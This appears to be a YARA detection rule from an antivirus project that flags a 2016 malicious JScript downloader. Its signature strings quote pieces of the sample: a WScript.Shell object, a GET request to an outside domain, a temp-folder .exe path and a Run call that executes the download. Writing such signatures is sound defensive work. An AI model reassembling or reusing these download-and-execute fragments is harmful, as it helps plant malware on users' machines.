rule sig_20160329_be19ad369afb560157fa6f3f4710fd34 {
  meta:
    description = "datamaliciousorder - file 20160329_be19ad369afb560157fa6f3f4710fd34.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1601dc6ee9178b9243b5eecbe41095aece43fe8c7d8ef0fed606573baa6590f3"

  strings:
    $s1  = "function Pfwyq() {return Ohwtuacdqe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"YM7PHktEedxakVa.exe\";};" fullword ascii
    $s2  = "Hydwme[Jwgpbhakoq](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Fplplgxs](Nnqaav() * 11)} while (Hydwme[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Gnozcqnk(Esqvti, Vykthg){return Esqvti - Vykthg;};" fullword ascii
    $s5  = "var Ohwtuacdqe = function Ccdonbxmzx() {return WScript[Gwcmey](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bbxmgdbx(Uvtkw){Ohwtuacdqe[\"Run\"](Uvtkw, Hmvajebary, Hmvajebary);};" fullword ascii
    $s7  = "function Zjpygiige() {return ((Apftvc == true) && (Apftvc == Plzodmyi)) ? 1 : Hmvajebary;};" fullword ascii
    $s8  = "var Gsrjw = false;" fullword ascii
    $s9  = "function Nnqaav(){return 22;};" fullword ascii
    $s10 = "return Gnozcqnk(Ruzemuqd, Iterz);" fullword ascii
    $s11 = "Apftvc = true; " fullword ascii
    $s12 = "var Apftvc = false;" fullword ascii
    $s13 = "var Onzcz = new this[\"Date\"]();" fullword ascii
    $s14 = "function Ghkuxiy(Wqsyzr) {var Czdgnvrgvl = (1, 2, 3, 4, 5, Wqsyzr); return Czdgnvrgvl;};" fullword ascii
    $s15 = "function Cdvlpjblu()" fullword ascii
    $s16 = " while (Seoagkvzjk){" fullword ascii
    $s17 = "function Aajnponh(){return Qgczrrcjr;};" fullword ascii
    $s18 = "Plzodmyi = true; " fullword ascii
    $s19 = "var Plzodmyi = false;" fullword ascii
    $s20 = "function Ugzpvy(){return Gwcmey;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}